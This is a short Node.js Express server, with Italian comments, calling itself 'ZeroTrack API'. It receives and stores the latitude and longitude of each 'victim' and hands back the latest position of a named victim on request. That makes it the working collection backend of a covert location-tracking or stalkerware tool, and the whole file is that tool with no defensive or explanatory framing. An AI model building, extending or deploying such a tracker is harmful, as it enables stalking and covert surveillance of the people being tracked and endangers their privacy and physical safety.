const express = require('express')
const app = express()
app.use(express.json())  // <-- SOLO questo, rimuovi express.text()
let store = {}

app.post('/', (req, res) => {
  const { victim, lat, lon } = req.body
  if (victim && lat != null && lon != null) {
    store[victim] = { lat, lon, ts: Date.now() }
    res.json({ok: true})
  } else {
    res.status(400).json({error: "bad request"})
  }
})

app.get('/', (req, res) => {
  const victim = req.query.victim
  const data = victim && store[victim]
  res.json(data || {error: "not found"})
})

const port = process.env.PORT || 8080
app.listen(port, () => {
  console.log(`Server ZeroTrack API online su porta ${port}`)
})
